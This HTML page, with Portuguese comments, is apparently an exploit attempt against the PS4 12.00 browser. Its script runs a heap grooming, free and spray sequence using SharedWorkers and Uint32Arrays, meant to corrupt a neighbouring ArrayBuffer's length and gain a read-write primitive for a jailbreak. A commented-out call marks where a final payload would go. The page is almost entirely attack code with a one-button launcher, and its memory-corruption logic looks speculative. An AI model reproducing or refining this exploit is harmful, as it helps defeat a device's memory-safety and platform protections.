<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Precision Overlap</title>
   
</head>
<body>

    <h1>PS4 12.00 PRECISION OVERLAP</h1>
    <h3>Alvo: ArrayBuffer Length Corruption (Zona 404)</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_precision_overlap()">INICIAR</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. O CORRUPTOR
        // =================================================================
        function build_corruptor() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            // Valor gigante para sobrescrever o tamanho do vizinho
            buffer.fill(0x40000000); 
            return buffer;
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var pairs = []; // Pares {worker, array}
        var filler = [];

        async function run_precision_overlap() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            var payload = build_corruptor();
            
            // FASE 1: BASE SÓLIDA (0-390)
            log("Fase 1: Grooming (0-390)...");
            for(let i=0; i < 390; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "fill_"+i);
                    w.port.start();
                    filler.push(w);
                } catch(e){}
            }

            // FASE 2: SANDUÍCHE NA ZONA DE PERIGO (390-404)
            log("Fase 2: Construindo Sanduíches (390-404)...");
            document.getElementById("status").innerText = "Preparando Armadilha...";
            
            var p_count = 0;
            // Vamos até 404 (390 + 14)
            var limit = 14; 

            var interval = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(interval);
                    trigger_attack(payload); 
                    return;
                }

                try {
                    // 1. Cria Worker (Vítima)
                    var id = 391 + p_count;
                    var w = new SharedWorker("data:text/javascript,1", "victim_"+id);
                    w.port.start();
                    
                    // 2. Cria ArrayBuffer (Alvo) IMEDIATAMENTE DEPOIS
                    // Tamanho 0x1000 (4KB) é um tamanho comum de página
                    var ab = new ArrayBuffer(0x1000);
                    var view = new Uint32Array(ab);
                    view[0] = 0xCAFEBABE; // Marcador

                    // Guarda o par
                    pairs.push({ worker: w, array: ab, view: view, id: id });
                    
                    log(`Par ${id} alocado.`);
                } catch(e) { log("Erro: " + e); }
                
                p_count++;
            }, 150);
        }

        function trigger_attack(payload) {
            log("!!! ZONA CRÍTICA ATINGIDA. DISPARANDO !!!", "warn");
            document.getElementById("status").innerText = "ATACANDO...";

            // Atacamos de cima para baixo (do 404 ao 400)
            var attempts = 0;
            var attack_int = setInterval(() => {
                if (attempts >= 5 || pairs.length === 0) {
                    clearInterval(attack_int);
                    log("Ataque finalizado.");
                    return;
                }

                var item = pairs.pop(); // Pega o último (404)
                
                log(`Atacando Worker ${item.id}...`);
                
                // 1. FREE
                item.worker.port.close();
                item.worker = null;

                // 2. SPRAY
                var spray = [];
                for(let k=0; k<1000; k++) {
                    spray.push(new Uint32Array(payload));
                }

                // 3. CHECK (O Array vizinho cresceu?)
                if (item.array.byteLength > 0x1000) {
                    log("!!! SUCESSO ABSOLUTO !!!", "success");
                    log(`Array ${item.id} corrompido!`, "success");
                    log(`Novo tamanho: ${item.array.byteLength}`, "success");
                    alert("JAILBREAK: Primitiva RW obtida!");
                    clearInterval(attack_int);
                    
                    // AQUI ATIVARÍAMOS O PAYLOAD FINAL
                    // enable_jailbreak(item.array); 
                    return;
                } else {
                    log(`Falha no par ${item.id}. Tamanho: ${item.array.byteLength}`);
                }

                attempts++;
            }, 300);
        }
    </script>
</body>
</html>
